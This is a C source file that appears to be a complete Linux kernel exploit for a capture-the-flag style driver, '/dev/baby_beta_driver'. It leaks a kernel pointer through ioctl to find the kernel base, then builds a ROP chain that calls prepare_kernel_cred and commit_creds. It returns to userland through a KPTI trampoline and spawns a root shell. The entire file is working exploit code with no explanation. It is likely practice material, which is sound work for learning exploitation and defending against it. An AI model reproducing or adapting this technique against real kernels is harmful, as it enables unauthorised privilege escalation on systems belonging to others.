#define _GNU_SOURCE
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdbool.h>
#include <poll.h>

#include <sys/uio.h>
#include <sys/mman.h>
#include <sys/wait.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include <sys/socket.h>
#include <sys/syscall.h>

#include <pthread.h>

#define DRIVER_PATH "/dev/baby_beta_driver"
#define CMD_IN 0x1337C0DE
#define CMD_OUT 0xC0DE1337

#define PAGE_SHIFT  12

#define PRESS_KEY() \
  do { fprintf(stdout, "[ ] press key to continue...\n"); getchar(); } while(0)

void
hexdump(const void* data, size_t size)
{
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        fprintf(stdout, "%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            fprintf(stdout, " ");
            if ((i+1) % 16 == 0) {
                fprintf(stdout, "|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    fprintf(stdout, " ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    fprintf(stdout, "   ");
                }
                fprintf(stdout, "|  %s \n", ascii);
            }
        }
    }
}

uint64_t __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
uint64_t __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);


size_t user_cs, user_ss, user_rflags, user_sp;

void
save_status(void)
{
    asm __volatile__(
        "mov %0, cs;"
        "mov %1, ss;"
        "mov %2, rsp;"
        "pushf;"
        "pop %3;"
        : "=r" (user_cs), "=r" (user_ss), "=r" (user_sp), "=r" (user_rflags) : : "memory"
    );
    printf("[+] status has been saved\n");
}

void
shell(void)
{
    char *args[] = { "/bin/sh", NULL };
    execve(args[0], args, NULL);
}

int
error(const char *msg)
{
    printf("[-] %s\n", msg);
    exit(1);
}

typedef struct {
    uint32_t size;
    uint32_t reserved;
    void *data;
} request_t;

int
main(int argc, char *argv[])
{
    save_status();

    int err = 0;
    int fd = open(DRIVER_PATH, O_RDWR);
    if (fd < 0) {
        error("failed to open driver");
    }

    request_t req_in = {
        .size = 0x30,
        .data = 0
    };
    err = ioctl(fd, CMD_IN, &req_in);

    uint64_t *leak = mmap(0xdead000,
        getpagesize(),
        PROT_READ | PROT_WRITE | PROT_EXEC,
           MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,
        0,
        0
    );
    request_t req_out = {
        .size = 0x30,
        .data = leak
    };
    err = ioctl(fd, CMD_OUT, &req_out);
    hexdump((const void *) leak, 0x30);

    uint64_t kbase      = leak[1] - 0x848fe0;
    prepare_kernel_cred = kbase + 0x53bb0;
    commit_creds        = kbase + 0x53d00;
    
    printf("[+] kbase @ %p\n", kbase);
    printf("[+] prepare_kernel_cred @ %p\n", prepare_kernel_cred);
    printf("[+] commit_creds @ %p\n", commit_creds);

    uint64_t pop_rax         = kbase + 0x173d1;
    uint64_t pop_rdi         = kbase + 0x11a54d;
    uint64_t pop_rsi         = kbase + 0x5c00;
    uint64_t pop_rdx         = kbase + 0x1401f6;
    uint64_t mov_rdi_rax     = kbase + 0x143b4c;
    uint64_t ret             = kbase + 0x1dc;
    uint64_t kpti_trampoline = kbase + 0x200cc6; 

    uint64_t *rop = mmap(0xfead000,
        getpagesize(),
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_ANONYMOUS | MAP_PRIVATE | MAP_FIXED,
        0,
        0
    );

    PRESS_KEY();

    uint64_t *rop_start = rop;
    rop = ((uint8_t *) rop_start + 0x30);

    *rop++ = 0xaaaaaaaa; // rbx
    *rop++ = 0xbbbbbbbb; // r12
    *rop++ = pop_rdi;
    *rop++ = 0;
    *rop++ = prepare_kernel_cred;
    *rop++ = pop_rdx;
    *rop++ = ret;
    *rop++ = mov_rdi_rax; // + call rdx + pop rbp
    *rop++ = 0;
    *rop++ = commit_creds; // rdi - creds
    *rop++ = kpti_trampoline;
    *rop++ = 0;
    *rop++ = 0;
    *rop++ = &shell;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_sp;
    *rop++ = user_ss;


    request_t req_in2 = {
        .size = 0x108,
        .data = rop_start
    };
    err = ioctl(fd, CMD_IN, &req_in2);
    
    request_t req_pwn = {
        .size = 0x108,
        .data = rop_start
    };
    err = ioctl(fd, CMD_OUT, &req_pwn);

    return 0;
}